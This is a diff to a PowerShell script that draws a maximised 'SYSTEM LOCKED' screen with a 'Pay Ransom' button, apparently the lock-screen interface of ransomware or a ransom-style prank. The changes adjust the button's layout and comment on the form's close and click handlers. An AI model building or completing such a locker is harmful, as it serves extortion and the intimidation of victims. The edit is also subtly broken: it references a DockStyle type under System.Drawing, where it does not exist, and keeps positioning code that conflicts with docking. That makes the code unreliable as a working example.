@@ -10,6 +10,8 @@ if ($MessageFile -and (Test-Path $MessageFile)) {
 Add-Type -AssemblyName System.Windows.Forms
 Add-Type -AssemblyName System.Drawing
 
+# ... (Keep the param block and Add-Type lines at the top) ...
+
 $form = New-Object System.Windows.Forms.Form
 $form.Text = "SYSTEM LOCKED"
 $form.WindowState = [System.Windows.Forms.FormWindowState]::Maximized
@@ -19,14 +21,16 @@ $form.BackColor = [System.Drawing.Color]::Black
 $form.StartPosition = "CenterScreen"
 $form.KeyPreview = $true
 
+# LABEL (Text)
 $label = New-Object System.Windows.Forms.Label
 $label.Text = $Message
 $label.ForeColor = [System.Drawing.Color]::Lime
 $label.Font = New-Object System.Drawing.Font("Consolas", 26, [System.Drawing.FontStyle]::Bold)
 $label.TextAlign = "MiddleCenter"
-$label.Dock = [System.Windows.Forms.DockStyle]::Fill
+$label.Dock = [System.Windows.Forms.DockStyle]::Fill # Fills the screen
 $form.Controls.Add($label)
 
+# BUTTON
 $button = New-Object System.Windows.Forms.Button
 $button.Text = "Pay Ransom"
 $button.Font = New-Object System.Drawing.Font("Consolas", 20, [System.Drawing.FontStyle]::Bold)
@@ -35,9 +39,13 @@ $button.BackColor = [System.Drawing.Color]::DarkRed
 $button.FlatStyle = "Flat"
 $button.Width = 320
 $button.Height = 90
-$button.Anchor = "Bottom"
+$button.Dock = [System.Drawing.DockStyle]::Bottom # Anchors it to the bottom
 $form.Controls.Add($button)
 
+# CRITICAL FIX: Bring the button to the front so the label doesn't cover it
+$button.BringToFront()
+
+# (Keep the rest of the script: Add_Click, Add_FormClosing, Application::Run)
 $form.Add_Shown({
     $button.Left = [int](($form.ClientSize.Width - $button.Width) / 2)
     $button.Top  = [int]($form.ClientSize.Height - $button.Height - 60)
